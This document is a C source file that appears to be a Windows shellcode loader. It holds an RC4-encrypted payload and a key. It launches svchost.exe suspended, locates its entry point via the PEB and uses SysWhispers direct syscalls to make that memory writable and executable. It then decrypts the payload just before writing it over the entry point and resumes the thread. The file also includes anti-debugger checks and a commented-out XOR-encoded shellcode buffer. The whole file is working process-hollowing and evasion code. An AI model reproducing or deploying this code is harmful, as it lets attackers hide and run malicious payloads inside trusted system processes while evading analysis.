#include "typedef.h"
#include "Syswhispers.h"
#include <Windows.h>
#include <stdio.h>


// this is what SystemFunction032 function take as a parameter
typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

unsigned char Rc4CipherText[] = {
        0xA8, 0xA4, 0xCE, 0x2A, 0x86, 0xD4, 0xB6, 0x85, 0x19, 0xCC, 0x21, 0x61, 0xE1, 0xC3, 0x07, 0xFD,
        0x80, 0xFB, 0x43, 0x61, 0x3C, 0x6D, 0x2C, 0xD2, 0x15, 0xE0, 0xD9, 0x01, 0x34, 0x70, 0x0B, 0xDA,
        0x4C, 0x76, 0x71, 0x77, 0xB1, 0x30, 0xED, 0x27, 0x98, 0x6B, 0xE3, 0x04, 0x6B, 0xD6, 0x14, 0x02,
        0x36, 0xE0, 0xAF, 0x27, 0x7C, 0x6B, 0x0B, 0x6B, 0x2F, 0x96, 0xC5, 0xE5, 0x85, 0x8D, 0x70, 0x06,
        0xBC, 0x8E, 0xA1, 0x65, 0xDB, 0x2A, 0x93, 0x7B, 0x29, 0x07, 0xA9, 0xC9, 0x79, 0xDD, 0x84, 0xAB,
        0xDE, 0x52, 0xD0, 0xD8, 0xF4, 0xF9, 0xCE, 0x08, 0xC3, 0xA7, 0x6B, 0x95, 0x27, 0x40, 0x6A, 0xE9,
        0xB5, 0x38, 0xC3, 0x72, 0x89, 0xCA, 0x6A, 0xA8, 0xA2, 0xE8, 0x09, 0x09, 0xA7, 0x02, 0xA6, 0xB3,
        0x37, 0x39, 0xF3, 0x0D, 0xBA, 0x80, 0xF6, 0x20, 0x38, 0xC1, 0x49, 0x50, 0x4D, 0xB8, 0xCB, 0x50,
        0xAB, 0x6E, 0x69, 0xFA, 0x49, 0xBC, 0x53, 0x4D, 0x82, 0xC2, 0x09, 0x61, 0xF5, 0x7B, 0x62, 0x1B,
        0x56, 0xA8, 0x5F, 0xEF, 0xC4, 0xFD, 0xC8, 0xC9, 0x37, 0x84, 0xF5, 0x55, 0x9A, 0xAE, 0xC9, 0x11,
        0x83, 0x29, 0x16, 0xD3, 0xA1, 0x34, 0x37, 0x2A, 0x6D, 0x73, 0x6E, 0x72, 0x85, 0x1F, 0xD7, 0xC3,
        0x31, 0x1F, 0x6C, 0xEA, 0x78, 0x58, 0x9F, 0xF4, 0x50, 0x8E, 0xF5, 0x26, 0xC9, 0x7F, 0x87, 0x1D,
        0x4C, 0x8C, 0x6E, 0xF0, 0xC0, 0xAE, 0x05, 0xE0, 0xDD, 0xEE, 0x28, 0xDF, 0x39, 0x17, 0x53, 0x42,
        0xFD, 0xDC, 0x00, 0xBD, 0x31, 0xD8, 0xA0, 0x39, 0x3C, 0x56, 0x89, 0x86, 0x6E, 0x83, 0x32, 0x4B,
        0xBD, 0x1A, 0x0E, 0xFB, 0xA8, 0x11, 0xC6, 0x9F, 0xB1, 0x7A, 0x42, 0x49, 0x84, 0x52, 0x6B, 0xB2,
        0xE6, 0xE6, 0x24, 0x0F, 0x6D, 0x42, 0xD8, 0x65, 0x3B, 0x0C, 0x96, 0x38, 0x87, 0xDD, 0xA4, 0x48,
        0xA5, 0x4C, 0x15, 0xEC, 0x69, 0x95, 0x19, 0x89, 0xD3, 0xB8, 0xD6, 0xB5, 0xAF, 0xC2, 0xF2, 0xD7,
        0x32, 0x95, 0xA5, 0x23, 0x97, 0x79, 0x2C, 0x76, 0x18, 0x84, 0x07, 0xC8, 0xC6, 0xA2, 0xE0, 0x0D,
        0x5D, 0x14, 0x18, 0x05, 0x1F, 0x3B, 0x19, 0xCD, 0xC3, 0xDB, 0x64, 0x25, 0x77, 0x10, 0xCE, 0x27,
        0x6F, 0xFA, 0xDD, 0x59, 0x62, 0x80, 0x09, 0xC1, 0x8E, 0x68, 0x1E, 0xCC, 0xE7, 0x2B, 0xA3, 0xF6,
        0x00, 0xFB, 0x13, 0xC7, 0x2E, 0x00, 0xD8, 0x35, 0x7D, 0xF3, 0xCB, 0x52, 0x64, 0x0E, 0x2B, 0x60,
        0x7A, 0xF6, 0xFF, 0x7E, 0x70, 0x8D, 0xA4, 0x08, 0xB3, 0xD5, 0x8C, 0xBB, 0x79, 0xF5, 0x5D, 0x4D,
        0x4B, 0x0E, 0xE5, 0x67, 0xA0, 0x51, 0xDE, 0x12, 0x79, 0x02, 0xA6, 0x2A, 0x9B, 0x66, 0x75, 0x41,
        0xE7, 0x21, 0xBA, 0xDD, 0x1E, 0x50, 0x98, 0xF2, 0x36, 0x39, 0x41, 0x96, 0xE4, 0x1C, 0x7C, 0x25,
        0xC9, 0xCF, 0xF0, 0x0B, 0x43, 0x11, 0xC6, 0x41, 0xA7, 0x86, 0x93, 0x10, 0x2E, 0x0A, 0xCE, 0xFF,
        0x23, 0x7D, 0xB4, 0xF5, 0x5C, 0x0B, 0xA1, 0x3F, 0x34, 0x95, 0x48, 0x62, 0x43, 0x9A, 0x98, 0x0A,
        0x08, 0xA8, 0xD0, 0xA3, 0x95, 0xE3, 0xB3, 0xAB, 0x13, 0x1D, 0x9A, 0x42, 0xB8, 0x57, 0xE1, 0x0E,
        0x8F, 0x43, 0x31, 0x5F, 0xEA, 0xE0, 0x09, 0x68, 0x89, 0x99, 0xC6, 0xEB, 0xC6, 0xA9, 0x3D, 0x3A,
        0x1B, 0x2E, 0x70, 0x27, 0x9A, 0xD2, 0x4E, 0x4A, 0xCD, 0xF4, 0xAA, 0x07, 0x9B, 0x8D, 0xA0, 0xA4,
        0x91, 0x06, 0xA0, 0x31, 0xA3, 0xF1, 0x33, 0x55, 0x36, 0x16, 0xE5, 0x28, 0xBA, 0x05, 0xAA, 0xFF,
        0xF9, 0x62, 0xB3, 0x7B, 0x02, 0x0E, 0x5A, 0x7D, 0x83, 0x87, 0xB2, 0xE0, 0x14, 0xFF, 0x2A, 0xD9,
        0xA8, 0x4E, 0xD6, 0x16, 0x0D, 0x29, 0x84, 0xD8, 0xC9, 0xC3, 0xF0, 0xE9, 0xEB, 0x40, 0xE2, 0x70,
        0x79, 0x66, 0xD4, 0xFF, 0xA5, 0xC2, 0x81, 0xE7, 0x47, 0x8F, 0xAA, 0xD5, 0xC7, 0x3A, 0x6C, 0xCE,
        0x63, 0xDF, 0x60, 0x46, 0x3B, 0xEE, 0x55, 0x6B, 0x33, 0xEB, 0x4F, 0x34, 0x2D, 0xA0, 0xAC, 0x04,
        0xCA, 0xB7, 0x70, 0xF8, 0x5A, 0x5D, 0xCC, 0xF6, 0x52, 0x26, 0x12, 0xE6, 0xD3, 0x12, 0xE3, 0x66,
        0xFE, 0xD6, 0xF3, 0xEB, 0xDA, 0x4F, 0xBB, 0xA5, 0x03, 0xD4, 0xA7, 0x3D, 0xDC, 0xF3, 0xE6, 0xEC,
        0x2C, 0xCE, 0xBE, 0x81, 0xC2, 0x59, 0xB7, 0xB1, 0x5D, 0xF2, 0x0E, 0x99, 0x01, 0x02, 0xA2, 0xD3,
        0xE4, 0xCE, 0x3F, 0xC2, 0x34, 0xAB, 0x36, 0xD1, 0xCD, 0x0D, 0x4A, 0xF7, 0x09, 0x64, 0xE0, 0xE8,
        0x71, 0x5D, 0x30, 0x65, 0xD6, 0x8E, 0x0C, 0x0E, 0x61, 0xB2, 0xEE, 0xC3, 0x04, 0x44, 0x09, 0xBF,
        0x22, 0x37, 0xDB, 0x9E, 0x64, 0x82, 0x59, 0xC1, 0xB2, 0xE8, 0xEC, 0x7A, 0x56, 0xC7, 0x08, 0x66,
        0x13, 0x73, 0xBE, 0xCA, 0xB9, 0xA0, 0xDD, 0xF3, 0x63, 0x40, 0xF4, 0xC9, 0xDA, 0xCD, 0x40, 0x21,
        0x5A, 0x52, 0xF5, 0xEF, 0xE1, 0xBD, 0x7E, 0x91, 0x66, 0x35, 0x11, 0x58, 0x59, 0xDA, 0xD1, 0x79,
        0xD1, 0x0F, 0x49, 0x45, 0xC2, 0xA7, 0x8C, 0xA6, 0xA0, 0x95, 0x93, 0xDF, 0x69, 0xD3, 0xC1, 0x5A,
        0x19, 0x24, 0xF4, 0x39, 0x37, 0xD3, 0x0A, 0xF7, 0x90, 0xBB, 0x2A, 0x0D, 0xBC, 0x65, 0x43, 0x24,
        0x23, 0xE1, 0x23, 0x65, 0xBE, 0xE5, 0x5E, 0x96, 0xA5, 0x85, 0x4D, 0xD4, 0xEC, 0x00, 0x2C, 0x9C,
        0xC1, 0x5D, 0xB8, 0xB6, 0x8D, 0xE4, 0x55, 0x89, 0x82, 0x79, 0xB5, 0x2C, 0x9F, 0x6B, 0x23, 0xC4,
        0x07, 0x4D, 0x9C, 0x00, 0x12, 0xC1, 0x6F, 0x1A, 0x07, 0x42, 0x48, 0x1F, 0xB5, 0xE1, 0xE9, 0x9D,
        0xFE, 0x79, 0x38, 0x3A, 0x8F, 0x99, 0x2D, 0x20, 0x40, 0x91, 0x56, 0x0F, 0xD7, 0x70, 0x79, 0xC6,
        0x8C, 0xBB, 0x82, 0x28, 0xAC };


unsigned char Rc4Key[] = {
        0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };

void printByteArray(const unsigned char* array, size_t size) {
    printf("Contents of the byte array:\n");
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", array[i]); // Print each byte in hexadecimal format
    }
    printf("\n", array);
}

BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
    
    printf("Size payload: %d\n", sPayload);


    //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
    //to do this we first find the PEB then using offsets calculate the entry point

    //step 1. find the PEB
    //  _Out_     PVOID            ProcessInformation,

    PROCESS_BASIC_INFORMATION basicInformation = { 0 };
    printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
    //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
    NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");

    myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);



    //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
    printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);

    //Now with PEB get offsets to image entry point 

    uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
    BYTE procAddr[64];
    BYTE dataBuff[0x200];
    SIZE_T bytesRW = 0;
    // THis 64 is based on the architecture used...
    
    //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);

    uintptr_t executableAddress = *((uintptr_t*)procAddr);//
    
    //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
    result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);

    unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
    unsigned int rvaOffset = e_lfanew + 0x28;

    unsigned int rva = *((unsigned int*)(dataBuff + rvaOffset));

    uintptr_t entrypointAddr = executableAddress + rva;
    PVOID test = (PVOID)entrypointAddr;
    ULONG sizer = sPayload;
    DWORD oldPerm = PAGE_EXECUTE_READWRITE;

    printf("Entrypoint: 0x%lp\n", test);
    printf("Size payload: %d", sPayload);

    PVOID sizeTest = (PVOID)sPayload;

    //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    
    
    //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
    //BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);

    printf("Address of optional header offset: 0x%p\n", e_lfanew);
    printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
    printf("Executable ADDR: 0x%lp\n", executableAddress);
    printf("Entrypoint ADDR: 0x%lp\n", test);
    printf("Entrypoint: 0x%lp\n", entrypointAddr);
    printf("Change Perms: %X\n", result);
    getchar();



    printf("\nentrypoint: 0x%p\n", entrypointAddr);
    printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
    printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
    printf("&Test pvoid : 0x % p\n", &test);
    printf("Test : 0x%p\n", test);



    getchar();
    ULONG read = 0;
    
    //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
    Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
    BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
   
    // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
    //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);


    //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {

    //results = syscalls.myNtWriteVirtualMemory(Pi.hProcess, (LPVOID)entrypointAddr, truePayload, sizeof(truePayload), &numBytesWritten);
    //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
    printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
    printByteArray(Rc4CipherText, sizeof(Rc4CipherText));
    getchar();
    
    //ResumeThread(Pi.hThread);
    PULONG suspendCount;
    Sw3NtResumeThread(Pi.hThread, &suspendCount);
}

void detectDebug() {

    // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag
    
    DWORD64 isDebuggerPreset = 0;
    
    NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");

    BOOL STATUS = myNtQueryProcessInformation2(
        GetCurrentProcess(),
        ProcessDebugPort,
        &isDebuggerPreset,
        sizeof(DWORD64),
        NULL
    );
    if (isDebuggerPreset != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");

        //return TRUE;
    }
    printf("No debugger present...\n");
    DWORD64 hProcessDebugObject = NULL;

    STATUS = myNtQueryProcessInformation2(
        GetCurrentProcess(),
        ProcessDebugObjectHandle,
        &hProcessDebugObject,
        sizeof(DWORD64),
        NULL
    );

    // If STATUS is not 0 and not 0xC0000353 (that is 'STATUS_PORT_NOT_SET')
    if (STATUS != 0x0 && STATUS != 0xC0000353) {
        printf("\t[!] NtQueryInformationProcess [2] Failed With Status : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means we are being debugged
    if (hProcessDebugObject != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        //return TRUE;
    }
    printf("No process debuger object present...\n");

    return FALSE;
}

int main() {


    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    BOOL success = FALSE;
    success = CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL,
        NULL, //p handle cannot be inheritied by child process
        NULL, //thread handle cannot be inheritied yb child since NULL
        PROCESS_ALL_ACCESS,
        CREATE_SUSPENDED,
        NULL, //use def environmen vars
        NULL, //inherit current dir as parent.
        &Si,
        &Pi
    );

    //BYTE buf[761] = { 0x56, 0xE2, 0x29, 0x4E, 0x5A, 0x42, 0x66, 0xAA, 0xAA, 0xAA, 0xEB, 0xFB, 0xEB, 0xFA, 0xF8, 0xFB, 0xE2, 0x9B, 0x78, 0xFC, 0xCF, 0xE2, 0x21, 0xF8, 0xCA, 0xE2, 0x21, 0xF8, 0xB2, 0xE2, 0x21, 0xF8, 0x8A, 0xE7, 0x9B, 0x63, 0xE2, 0x21, 0xD8, 0xFA, 0xE2, 0xA5, 0x1D, 0xE0, 0xE0, 0xE2, 0x9B, 0x6A, 0x06, 0x96, 0xCB, 0xD6, 0xA8, 0x86, 0x8A, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x48, 0x47, 0xF8, 0xEB, 0xFB, 0xE2, 0x21, 0xF8, 0x8A, 0x21, 0xE8, 0x96, 0xE2, 0xAB, 0x7A, 0xCC, 0x2B, 0xD2, 0xB2, 0xA1, 0xA8, 0xA5, 0x2F, 0xD8, 0xAA, 0xAA, 0xAA, 0x21, 0x2A, 0x22, 0xAA, 0xAA, 0xAA, 0xE2, 0x2F, 0x6A, 0xDE, 0xCD, 0xE2, 0xAB, 0x7A, 0x21, 0xE2, 0xB2, 0xEE, 0x21, 0xEA, 0x8A, 0xFA, 0xE3, 0xAB, 0x7A, 0x49, 0xFC, 0xE7, 0x9B, 0x63, 0xE2, 0x55, 0x63, 0xEB, 0x21, 0x9E, 0x22, 0xE2, 0xAB, 0x7C, 0xE2, 0x9B, 0x6A, 0x06, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x92, 0x4A, 0xDF, 0x5B, 0xE6, 0xA9, 0xE6, 0x8E, 0xA2, 0xEF, 0x93, 0x7B, 0xDF, 0x72, 0xF2, 0xEE, 0x21, 0xEA, 0x8E, 0xE3, 0xAB, 0x7A, 0xCC, 0xEB, 0x21, 0xA6, 0xE2, 0xEE, 0x21, 0xEA, 0xB6, 0xE3, 0xAB, 0x7A, 0xEB, 0x21, 0xAE, 0x22, 0xEB, 0xF2, 0xE2, 0xAB, 0x7A, 0xEB, 0xF2, 0xF4, 0xF3, 0xF0, 0xEB, 0xF2, 0xEB, 0xF3, 0xEB, 0xF0, 0xE2, 0x29, 0x46, 0x8A, 0xEB, 0xF8, 0x55, 0x4A, 0xF2, 0xEB, 0xF3, 0xF0, 0xE2, 0x21, 0xB8, 0x43, 0xE1, 0x55, 0x55, 0x55, 0xF7, 0xE2, 0x9B, 0x71, 0xF9, 0xE3, 0x14, 0xDD, 0xC3, 0xC4, 0xC3, 0xC4, 0xCF, 0xDE, 0xAA, 0xEB, 0xFC, 0xE2, 0x23, 0x4B, 0xE3, 0x6D, 0x68, 0xE6, 0xDD, 0x8C, 0xAD, 0x55, 0x7F, 0xF9, 0xF9, 0xE2, 0x23, 0x4B, 0xF9, 0xF0, 0xE7, 0x9B, 0x6A, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x10, 0x90, 0xFC, 0xD3, 0x0D, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0xA6, 0xAA, 0xAA, 0xAA, 0x9B, 0x9D, 0x98, 0x84, 0x98, 0x9A, 0x84, 0x9B, 0x9A, 0x84, 0x98, 0xAA, 0xF0, 0xE2, 0x23, 0x6B, 0xE3, 0x6D, 0x6A, 0x11, 0xAB, 0xAA, 0xAA, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xC0, 0xA9, 0xF9, 0xE3, 0x10, 0xFD, 0x23, 0x35, 0x6C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0x7B, 0xAA, 0xAA, 0xAA, 0x85, 0xF9, 0xFD, 0xC8, 0xE2, 0xEF, 0xEB, 0xC5, 0x9E, 0x87, 0xD9, 0xD9, 0xCF, 0xF0, 0xC2, 0x93, 0xC1, 0xCF, 0xE9, 0xE4, 0xFC, 0x87, 0xCD, 0xE6, 0xC4, 0x99, 0xCB, 0xFC, 0xDB, 0xC3, 0x9C, 0xE2, 0xCC, 0xEE, 0xC3, 0xDA, 0xC8, 0xC3, 0xF2, 0xC6, 0xE9, 0xCE, 0xCF, 0x87, 0xCF, 0xC5, 0xFA, 0x98, 0xE8, 0xEE, 0xF0, 0x9F, 0xDF, 0xE5, 0xC1, 0x87, 0xE7, 0x93, 0xFF, 0xDE, 0xEC, 0xC2, 0xED, 0xD0, 0xE3, 0xC4, 0xDE, 0x9C, 0xE0, 0xEF, 0x9C, 0xDE, 0xCD, 0xDF, 0xE5, 0x93, 0xE2, 0xCF, 0xCE, 0xDF, 0xC3, 0x9C, 0xE7, 0xFD, 0xCF, 0xD0, 0xD9, 0xFB, 0xC2, 0xDF, 0xC4, 0xDA, 0xDE, 0x9A, 0xEC, 0xDE, 0xFE, 0x9B, 0xF0, 0xC0, 0xD2, 0xD8, 0xFB, 0x9F, 0xFA, 0xE7, 0xDD, 0xD0, 0xEE, 0x9F, 0x87, 0xC5, 0x93, 0x93, 0xE0, 0xF3, 0xD8, 0xCD, 0xCF, 0xED, 0xC7, 0xC2, 0xCF, 0xC9, 0xC6, 0xDD, 0xC3, 0xE5, 0xED, 0xCB, 0x9D, 0x9E, 0xDD, 0xC1, 0xFB, 0xF8, 0xE5, 0x99, 0xEC, 0xD3, 0x9A, 0x98, 0xDC, 0xC0, 0x9A, 0x92, 0xE4, 0xDD, 0xDF, 0x98, 0xF8, 0xC9, 0xC7, 0xDA, 0x9B, 0xC4, 0xC7, 0xF0, 0xFB, 0xCC, 0xC5, 0x98, 0xC2, 0xD9, 0xCF, 0xE9, 0x92, 0x9B, 0xCC, 0xCE, 0xDF, 0xE7, 0x9A, 0xFA, 0xD2, 0xC3, 0xC7, 0xE8, 0xC2, 0xD0, 0x93, 0xDB, 0xDF, 0xD0, 0xE2, 0xC7, 0xC0, 0xE1, 0xEF, 0xC6, 0xE2, 0xD2, 0xCE, 0xCF, 0x9C, 0xFE, 0x9F, 0x9F, 0xC8, 0xFE, 0xD2, 0xF5, 0xFF, 0xEF, 0xCF, 0xDA, 0xCB, 0xC7, 0xAA, 0xE2, 0x23, 0x6B, 0xF9, 0xF0, 0xEB, 0xF2, 0xE7, 0x9B, 0x63, 0xF9, 0xE2, 0x12, 0xAA, 0x98, 0x02, 0x2E, 0xAA, 0xAA, 0xAA, 0xAA, 0xFA, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x41, 0xFF, 0x84, 0x91, 0x55, 0x7F, 0xE2, 0x23, 0x6C, 0xC0, 0xA0, 0xF5, 0xE2, 0x23, 0x5B, 0xC0, 0xB5, 0xF0, 0xF8, 0xC2, 0x2A, 0x99, 0xAA, 0xAA, 0xE3, 0x23, 0x4A, 0xC0, 0xAE, 0xEB, 0xF3, 0xE3, 0x10, 0xDF, 0xEC, 0x34, 0x2C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE7, 0x9B, 0x6A, 0xF9, 0xF0, 0xE2, 0x23, 0x5B, 0xE7, 0x9B, 0x63, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x87, 0xAC, 0xB2, 0xD1, 0x55, 0x7F, 0x2F, 0x6A, 0xDF, 0xB5, 0xE2, 0x6D, 0x6B, 0x22, 0xB9, 0xAA, 0xAA, 0xE3, 0x10, 0xEE, 0x5A, 0x9F, 0x4A, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x55, 0x65, 0xDE, 0xA8, 0x41, 0x00, 0x42, 0xFF, 0xAA, 0xAA, 0xAA, 0xF9, 0xF3, 0xC0, 0xEA, 0xF0, 0xE3, 0x23, 0x7B, 0x6B, 0x48, 0xBA, 0xE3, 0x6D, 0x6A, 0xAA, 0xBA, 0xAA, 0xAA, 0xE3, 0x10, 0xF2, 0x0E, 0xF9, 0x4F, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x39, 0xF9, 0xF9, 0xE2, 0x23, 0x4D, 0xE2, 0x23, 0x5B, 0xE2, 0x23, 0x70, 0xE3, 0x6D, 0x6A, 0xAA, 0x8A, 0xAA, 0xAA, 0xE3, 0x23, 0x53, 0xE3, 0x10, 0xB8, 0x3C, 0x23, 0x48, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x29, 0x6E, 0x8A, 0x2F, 0x6A, 0xDE, 0x18, 0xCC, 0x21, 0xAD, 0xE2, 0xAB, 0x69, 0x2F, 0x6A, 0xDF, 0x78, 0xF2, 0x69, 0xF2, 0xC0, 0xAA, 0xF3, 0x11, 0x4A, 0xB7, 0x80, 0xA0, 0xEB, 0x23, 0x70, 0x55, 0x7F };
    //BYTE truePayload[sizeof(buf)];
    //printByteArray(buf, sizeof(buf));
    //printByteArray(buf, sizeof(truePayload));
    //for (int i = 0; i < sizeof(buf); i++) {
    //    truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
    //}
    detectDebug();
    hollowProcess(Pi, sizeof(Rc4CipherText));
    return 0;
}
